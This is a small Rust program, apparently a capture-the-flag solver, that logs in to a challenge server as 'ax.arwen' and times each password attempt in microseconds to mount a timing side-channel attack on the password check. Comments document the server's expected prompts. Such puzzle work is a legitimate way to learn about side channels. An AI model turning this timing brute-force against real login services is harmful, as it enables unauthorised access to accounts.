use std::io::prelude::*;
use std::net::TcpStream;
use std::time::{Duration, Instant};
use std::env;

// Expected header:
// ======================================================================
// Welcome to Glitch Research Laboratory Network: Test Server 2 (GRLTS02)
// ======================================================================
// This machine requires authentication.
// Username: 
// length: 265 (there are crlfs for some reason)

// Expected response: 
// >> Please wait...
// >> Username OK. Password required
// Password: 
// length: 62

// Expected response 2: 
// >> Please wait...
// >> Password is incorrect.
// Username: 
// length: 54

fn try_pass(password: &str) -> std::io::Result<(Duration, bool)> {
    let mut stream = TcpStream::connect("fools2023.online:13338")?;

    let mut buf = [0_u8; 265];
    stream.read_exact(&mut buf)?;

    let username = "ax.arwen\n";
    stream.write_all(username.as_bytes())?;
    
    let mut buf = [0_u8; 62];
    stream.read_exact(&mut buf)?;

    stream.write_all(password.as_bytes())?;

    let start = Instant::now();

    stream.write(&[10])?;
    let mut buf = [0_u8; 54];
    stream.read_exact(&mut buf)?;

    let end = Instant::now();

    let dur = end - start;    

    let buf_str: String = String::from_utf8_lossy(&buf).to_string();
    let incorrect = buf_str.contains("incorrect");

    Ok((dur, !incorrect))
}

fn main() -> std::io::Result<()> {
    for arg in env::args().skip(1) {
        let (dur, correct) = try_pass(&arg)?;

        println!("{}, {}, {}", arg, dur.as_micros(), correct);
    }


    Ok(())
}